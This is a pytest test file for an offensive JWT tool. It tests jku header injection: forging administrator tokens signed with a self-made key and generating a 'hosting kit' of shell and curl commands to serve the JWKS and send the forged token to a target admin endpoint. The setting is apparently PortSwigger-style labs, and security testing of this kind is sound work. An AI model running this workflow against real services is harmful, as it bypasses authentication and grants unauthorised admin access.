"""jku header injection — the forged token plus a ready-to-host "HOSTING KIT".

Asserts the emitted JWKS parses, its kid matches the token header's kid, and the
PortSwigger exploit-server File field equals the jku URL path. No live hosting.
"""
import base64
import json
import subprocess
import sys
from pathlib import Path

import tanuki as jf

REPO_ROOT = Path(__file__).resolve().parent.parent
JKU_URL = "https://exploit.example.net/.well-known/jwks.json"


def _b64d(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _sample_jwt():
    h = jf.encode_segment({"alg": "RS256", "typ": "JWT", "kid": "orig"})
    p = jf.encode_segment({"sub": "wiener", "role": "user"})
    return jf.JWT(f"{h}.{p}.AAAA")


def _run_cli(args, timeout=60):
    proc = subprocess.run([sys.executable, "-m", "tanuki", *args],
                          cwd=str(REPO_ROOT), stdin=subprocess.DEVNULL,
                          capture_output=True, text=True, timeout=timeout)
    return proc.returncode, proc.stdout + proc.stderr


# ── artifacts: JWKS parses, kid matches, jku header set ─────────────────────────
def test_jku_artifacts_kid_matches_token():
    art, err = jf.attack_jku_injection(_sample_jwt(), {"sub": "administrator"}, JKU_URL)
    assert err is None
    jwks = json.loads(art["jwks_json"])                 # JWKS JSON parses
    token_hdr = json.loads(_b64d(art["token"].split(".")[0]))
    # kid is identical in the token header and the emitted JWKS
    assert token_hdr["kid"] == jwks["keys"][0]["kid"] == art["kid"]
    assert token_hdr["jku"] == JKU_URL                  # jku points at the URL
    assert jwks["keys"][0]["kty"] == "RSA"


# ── hosting kit: exploit-server File field == URL path ──────────────────────────
def test_hosting_kit_fields():
    art, _ = jf.attack_jku_injection(_sample_jwt(), {"sub": "administrator"}, JKU_URL)
    kit = jf.build_jku_hosting_kit(JKU_URL, art["jwks_json"], port=8000)
    assert kit["file"] == "/.well-known/jwks.json"      # File field == URL path
    assert kit["content_type"] == "application/json"
    assert json.loads(kit["body"]) == json.loads(art["jwks_json"])
    # local-server snippet writes the file at the jku path and serves it
    assert "mkdir -p .well-known" in kit["server_snippet"]
    assert "cat > .well-known/jwks.json" in kit["server_snippet"]
    assert "python3 -m http.server 8000" in kit["server_snippet"]


def test_hosting_kit_custom_port():
    art, _ = jf.attack_jku_injection(_sample_jwt(), {"sub": "x"}, JKU_URL)
    kit = jf.build_jku_hosting_kit(JKU_URL, art["jwks_json"], port=9999)
    assert "python3 -m http.server 9999" in kit["server_snippet"]
    assert "9999" in kit["reminder"]


def test_hosting_kit_pathless_url():
    # a URL with no path falls back to a sane default, no mkdir of ""
    art, _ = jf.attack_jku_injection(_sample_jwt(), {"sub": "x"}, "http://10.10.14.1:8000/jwks.json")
    kit = jf.build_jku_hosting_kit("http://10.10.14.1:8000/jwks.json", art["jwks_json"])
    assert kit["file"] == "/jwks.json"
    assert "mkdir -p" not in kit["server_snippet"]       # no directory component
    assert "cat > jwks.json" in kit["server_snippet"]


# ── option 2 runbook: self-host caveat + confirm + send-token steps ─────────────
def test_hosting_kit_self_host_runbook_cookie():
    art, _ = jf.attack_jku_injection(_sample_jwt(), {"sub": "administrator"}, JKU_URL)
    kit = jf.build_jku_hosting_kit(JKU_URL, art["jwks_json"], token=art["token"],
                                   target_url="https://t.example/admin", cookie="session")
    # prominent caveat that points back to option 1 for the exploit-server case
    assert "ONLY" in kit["self_host_note"] and "option 1" in kit["self_host_note"].lower()
    # confirm-reachable step hits the real jku URL
    assert kit["confirm_cmd"] == "curl -s " + JKU_URL
    # send step uses the REAL token, cookie name, and target URL (copy-paste ready)
    assert kit["send_cmd"] == 'curl -i -H "Cookie: session=%s" https://t.example/admin' % art["token"]
    assert "<THE_FORGED" not in kit["send_cmd"]
    assert "jku-attack token" in kit["token_reminder"]


def test_hosting_kit_send_defaults_to_bearer_header():
    art, _ = jf.attack_jku_injection(_sample_jwt(), {"sub": "x"}, JKU_URL)
    kit = jf.build_jku_hosting_kit(JKU_URL, art["jwks_json"], token=art["token"],
                                   target_url="https://t.example/api")
    # no --cookie -> Authorization: Bearer with the real token
    assert kit["send_cmd"] == 'curl -i -H "Authorization: Bearer %s" https://t.example/api' % art["token"]


def test_hosting_kit_serve_port_from_url_wins():
    # the token's jku port is authoritative; --jku-port only fills in when absent
    url = "http://10.10.14.5:8000/.well-known/jwks.json"
    art, _ = jf.attack_jku_injection(_sample_jwt(), {"sub": "x"}, url)
    kit = jf.build_jku_hosting_kit(url, art["jwks_json"], port=1337, token=art["token"])
    assert kit["port"] == 8000
    assert "python3 -m http.server 8000" in kit["server_snippet"]


# ── CLI: the HOSTING KIT prints; private key gated on --show-private ─────────────
def test_cli_prints_hosting_kit():
    token = "%s.%s.AAAA" % (jf.encode_segment({"alg": "RS256", "typ": "JWT"}),
                            jf.encode_segment({"sub": "wiener", "role": "user"}))
    rc, out = _run_cli([token, "--jku-url", JKU_URL, "--jku-port", "1337",
                        "--no-crack", "--no-replay", "-q", "--no-color"])
    assert rc == 0, out[-2000:]
    assert "jku Hosting Kit" in out
    assert "File:" in out and "/.well-known/jwks.json" in out
    assert "Content-Type:  application/json" in out
    assert "python3 -m http.server 1337" in out          # --jku-port honoured
    assert "Reachability" in out
    # private key is NOT printed by default
    assert "PRIVATE KEY" not in out


def test_cli_hosting_kit_send_uses_real_target_and_cookie():
    token = "%s.%s.AAAA" % (jf.encode_segment({"alg": "RS256", "typ": "JWT"}),
                            jf.encode_segment({"sub": "wiener", "role": "user"}))
    rc, out = _run_cli([token, "--jku-url", JKU_URL, "-u", "https://t.example/admin",
                        "--cookie", "session", "--claims", "sub=administrator",
                        "--no-crack", "--no-replay", "--no-jwe", "-q", "--no-color"])
    assert rc == 0, out[-2000:]
    # self-host caveat present and points to option 1 for the exploit-server case
    assert "option 1 instead" in out
    # confirm + send steps are real and copy-paste ready
    assert "curl -s " + JKU_URL in out
    assert 'curl -i -H "Cookie: session=eyJ' in out        # real cookie + real jku token
    assert "https://t.example/admin" in out
    assert "<THE_FORGED" not in out and "<target-url>" not in out
    assert "jku-attack token" in out


def test_cli_show_private_prints_key():
    token = "%s.%s.AAAA" % (jf.encode_segment({"alg": "RS256", "typ": "JWT"}),
                            jf.encode_segment({"sub": "wiener", "role": "user"}))
    rc, out = _run_cli([token, "--jku-url", JKU_URL, "--show-private",
                        "--no-crack", "--no-replay", "-q", "--no-color"])
    assert rc == 0, out[-2000:]
    assert "PRIVATE KEY" in out                           # now emitted
